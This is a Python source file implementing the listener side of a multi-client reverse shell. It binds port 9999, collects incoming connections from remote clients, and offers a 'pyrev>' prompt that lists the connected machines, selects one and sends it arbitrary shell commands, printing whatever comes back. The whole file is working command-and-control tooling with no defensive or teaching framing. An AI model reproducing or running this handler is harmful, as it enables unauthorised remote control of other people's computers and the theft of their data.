import socket
import threading
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1 , 2]
queue = Queue()
all_connections = []
all_addresses = []


#creating socket
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
        #print("Created a new socket")
    except socket.error as err:
        print("Error in creating Socket - ",err)

#Bind socket
def socket_bind():
    try:
        global host
        global port
        global s
       # print("Binding socket to port ",str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as err:
        print("Error in Binding socket - ",err)
        print("Trying to bind again...")
        socket_bind()

#accepting connections(multi-clients)
def accept_connections():
     for c in all_connections:
         c.close()
     del all_connections[:]
     del all_addresses[:]
     while 1:
         try:
             conn,addr = s.accept()
             conn.setblocking(1)
             all_connections.append(conn)
             all_addresses.append(addr)
             print("A new connection found by {} from port {}".format(addr[0],addr[1]))
         except:
             print("Error accepting new connections..")


 #interactive prompt
def py_rev_shell():
     while 1:
         cmd = input("pyrev>")
         if cmd =="list":
             list_connections()
         elif "select" in cmd:
             conn = get_target(cmd)
             if conn is not None:
                 send_target_commands(conn)
         else:
             print("{} command not recognized".format(cmd))


#display connections
def list_connections():
    results = ""

    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + "   " + str(all_addresses[i][0]) + "   " + str(all_addresses[i][1])+"\n"
    print("List of active connections:")
    print("Index   IP           Port")
    print(results)


#selecting a client
def get_target(cmd):
    try:
        target = cmd.replace("select ","")
        target = int(target)
        conn = all_connections[target]
        print("Connected to client")
        print(str(all_addresses[target][0]) + '>' ,end="")
        return conn
    except:
        print("Not a valid selection..")
        return None

#connect with remote client
def send_target_commands(conn):
    while 1:
        try:
            cmd = input(">")
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),"utf-8")
                print(client_response,end="")
            if cmd=="quit":
                break
        except:
            print("Connection lost with client..")
            break


#creating thread
def create_thread():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work) #create thread and assign work()
        t.daemon = True # thread dies when main program exit , if False then t runs background even after program is done
        t.start()

#do next task in queue
def work():
    while True:
        x = queue.get()
        if x ==1:
            socket_create()
            socket_bind()
            accept_connections()
        if x ==2:
            py_rev_shell()
        queue.task_done()




#assigning task for thread
def create_task():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()



create_thread()
create_task()